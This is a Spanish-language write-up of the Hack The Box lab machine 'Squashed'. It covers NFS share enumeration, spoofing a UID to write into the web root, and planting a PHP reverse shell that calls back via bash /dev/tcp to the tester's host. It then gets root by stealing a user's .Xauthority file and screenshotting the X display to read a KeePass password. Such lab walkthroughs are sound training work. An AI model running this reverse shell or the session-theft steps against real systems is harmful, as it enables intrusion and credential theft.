# 🏳 Squashed



<figure><img src="../../../../.gitbook/assets/2b64823934eb46f2c531a0b650a03d60.png" alt=""><figcaption></figcaption></figure>

<table><thead><tr><th width="227">Datos</th><th width="288.3333333333333"> </th><th>Notas</th></tr></thead><tbody><tr><td>Nombre de la máquina: </td><td><a href="https://app.hackthebox.com/machines/Squashed">Squashed</a></td><td></td></tr><tr><td>IP de la máquina:</td><td>10.10.11.191</td><td></td></tr><tr><td>Sistema simulado: </td><td></td><td></td></tr><tr><td>Servicio vulnerado: </td><td></td><td></td></tr><tr><td>CVEs:</td><td></td><td></td></tr></tbody></table>

### 1. Enumeración y descubrimiento

Comenzamos la fase de enumeración de la máquina Squashed realizando una petición mediante nmap a  la IP desplegada buscando la información necesaria para comenzar. Comenzamos:

```bash
nmap -sC -sV -sT 10.10.11.191 -p-
```

<figure><img src="../../../../.gitbook/assets/1 (15).png" alt=""><figcaption></figcaption></figure>

En este punto vemos varios servicios, un ssh en el puerto 22, un http en el puerto 80, un RPC en el 111 y un nfs en el 2049. En este punto vamos a acceder al http para ver que servicio está desplegado.&#x20;

<figure><img src="../../../../.gitbook/assets/2 (16).png" alt=""><figcaption></figcaption></figure>

A priori en la web no encontramos nada que nos llame la atención, pese a que existe un apartado de login al cual no se puede acceder y que parece que es el típico apartado no montado que tienen algunas páginas de máquinas en HTB.

Como tenemos un puerto NFS abierto en el 2049 vamos a probar a usar `showmount` y montar los directorios que tengan, si es que tienen alguno.&#x20;

<figure><img src="../../../../.gitbook/assets/3 (6).png" alt=""><figcaption></figcaption></figure>

Como hemos descubierto estos directorios vamos a intentar montarlos en nuestra máquina, en el directorio mnt.&#x20;

```bash
mkdir /mnt/ross_folder && mkdir /mnt/web_folder
mount -t nfs 10.10.11.191:/home/ross /mnt/ross_folder -o nolock
mount -t nfs 10.10.11.191:/var/www/html /mnt/web_folder -o nolock
```

En este punto podremos intentar acceder a los directorios que hemos montado en nuestro equipo. Cuando intentamos acceder a `/mnt/ross_folder` tenemos el contenido de la carpeta sin muchos problemas e incluso vemos un fichero de Keepass que nos llama la atención a primera instancia.&#x20;

<figure><img src="../../../../.gitbook/assets/4 (7).png" alt=""><figcaption></figcaption></figure>

El problema viene cuando intentamos acceder a `/mnt/webfolder` y nos aparece que no tenemos permisos para acceder al contenido aunque podemos listar parte del mismo.&#x20;

<figure><img src="../../../../.gitbook/assets/5 (7).png" alt=""><figcaption></figcaption></figure>

Aunque comprobamos los permisos del directorio webshare y descubirmos que tiene el userid 2017, por lo que tenemos margend e maniobra.

<figure><img src="../../../../.gitbook/assets/6 (7).png" alt=""><figcaption></figcaption></figure>

### 2. Explotación

En este punto para intentar acceder a la carpeta crearemos un usuario y lo añadiremos al grupo e id 2017 y cambiaremos a él.&#x20;

```
useradd [Usuario]
usermod -u 2017 [Usuario]
sudo groupmod -g 2017 [Usuario]
```

<figure><img src="../../../../.gitbook/assets/7 (7).png" alt=""><figcaption></figcaption></figure>

En este punto podremos acceder al directorio y nos aprovecharemos para elaborar una revershell la cual podamos ejecutar apuntando a nuestra máquina consiguiendo acceso a la de HTB.

```
<?php system("bash -c 'bash -i &>/dev/tcp/[IP]/[PORT] <&1'");?>
```

Una vez creado el archivo simplemente lo ejecutaremos en la ruta del navegador consiguiendo la conexión desde nuestro netcat.&#x20;

<figure><img src="../../../../.gitbook/assets/8 (3).png" alt=""><figcaption></figcaption></figure>

En este punto habremos conseguido una bash con el usuario alex en la máquina de HTB y podremos ver la flag del usuario sin problemas. &#x20;



### 3. Escalada de privilegios Root

Llegado este punto tenemos que intentar escalar de privilegios del usuario alex a root. Para ello el archivo de keepass puede que sea interesante, pero no tenemos la contraseña para desbloquearlo por lo que tenemos que intentar acceder. Se nos ocurre usar `keepass2john` pero no tenemos mucho éxito. Revisando la carpeta `/mnt/ross_folder` nos encontramos con el archivo `.Xauthority` el cual parece interesante y sobre el que encontramos algo de [información](https://askubuntu.com/questions/300682/what-is-the-xauthority-file) en internet.&#x20;

<figure><img src="../../../../.gitbook/assets/9 (4).png" alt=""><figcaption></figcaption></figure>

Al parecer este fichero almacena la sesión del usuario que se encontraba en `ross_folder` por lo cual probablemente sea el usuario ross u otro el cual nos permita escalar privilegios. Para explotar este usuario lo que vamos a hacer es pasar este archivo e intentar usarlo para iniciar sesión en el keepass. Observamos que el usuario tiene el UID 1001 por lo que repetimos los pasos realizados anteriormente con el usuario galletas y asignamos ese UID a un nuevo usuario.&#x20;

En este punto deberemos de pasar el fichero .Xauthority a /tmp y levantar un servidor python en esa carpeta para compartirlo.

```
cat /mnt/ross_folder/.Xauthority | base64 > /tmp/xauth
cd /tmp && python3 -m http.server
```

<figure><img src="../../../../.gitbook/assets/10 (5).png" alt=""><figcaption></figcaption></figure>

```bash
wget http://[IP]:8000/xauth 
```

En este punto nos habremos descargado el archivo authority y tendremos que ponerlo en nuestra variable de entorno para poder utilizarlo.

```
export XAUTHORITY=/tmp/.Xauthority
```

{% hint style="danger" %}
Si no consigues pasar bien el archivo Xauthority  tendrás errores de "no protocol specified" ya que no podrás ver la pantalla. Ten cuidado al pasarlo ya que es crucial para resolverlo.&#x20;
{% endhint %}

En este punto ya solo debemos de ejecutar xwd de manera que se nos genera una captura de pantalla cuando abramos el archivo de la pass y tengamos una captura de keepass.

```
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

Cuando hayamos conseguido acceso con el permiso instalado al hacer la captura de la pantalla nos aparecerá esta captura con la cual tendriamos acceso como root.&#x20;

<figure><img src="../../../../.gitbook/assets/11 (3).png" alt=""><figcaption></figcaption></figure>

En este momento iniciamos root en la máquina y accedemos a la flag finalizando la máquina.



<figure><img src="../../../../.gitbook/assets/12 (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si te he ayudado sígueme y apóyame en [Hack The Box ](https://app.hackthebox.com/profile/819073)
{% endhint %}

